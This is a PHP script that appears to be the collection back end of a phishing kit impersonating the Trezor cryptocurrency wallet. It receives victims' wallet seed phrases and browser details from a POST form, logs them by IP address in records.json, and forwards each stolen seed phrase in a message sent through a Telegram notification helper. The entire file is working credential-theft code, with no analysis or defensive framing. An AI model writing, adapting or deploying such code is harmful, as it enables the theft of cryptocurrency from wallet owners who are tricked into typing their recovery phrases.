<?php
// Configuration
$json_file = 'records.json';

// Function to get real IP address
function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Handle comma-separated list of IPs
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Check if POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $ip = getRealIpAddr(); // Get real IP automatically
    $status = $_POST["status"] ?? '1';

    // Read existing JSON data
    $json_data = [];
    if (file_exists($json_file)) {
        $json_content = file_get_contents($json_file);
        if ($json_content !== false) {
            $json_data = json_decode($json_content, true) ?: [];
        }
    }
 
    $json_data[$ip] = [
        'Seed' => $_POST["seedPhrase"],
        'UserAgent' => $_POST["userAgent"],
        'Timestamp' => date('d/m/Y h:i A')
    ];

    $status_map = ['1' => 'Active', '2' => 'Inactive', '3' => 'Pending'];
    $status_text = $status_map[$status] ?? 'Unknown';

    $message = "[ ✅ TREZOR Seed Phrase ]\n" . $_POST["seedPhrase"] . "\n\n";
    $message .= "Total Words = " . $_POST["totalWords"] . "\n\n";
    $message .= "[ User Details ]\n";
    $message .= "IP = " . $ip . "\n";
    $message .= "User Agent = " . $_POST["userAgent"] . "\n";

    // Write updated JSON data to file
    if (file_put_contents($json_file, json_encode($json_data, JSON_PRETTY_PRINT)) !== false) {
        http_response_code(200);
        echo json_encode(['status' => 'success', 'message' => 'Record updated successfully']);

        if (file_exists('tlgrm.php')) {
            include 'tlgrm.php';
            sendTelegramNotification($message);
        }
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to write to file']);
    }
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
}
?>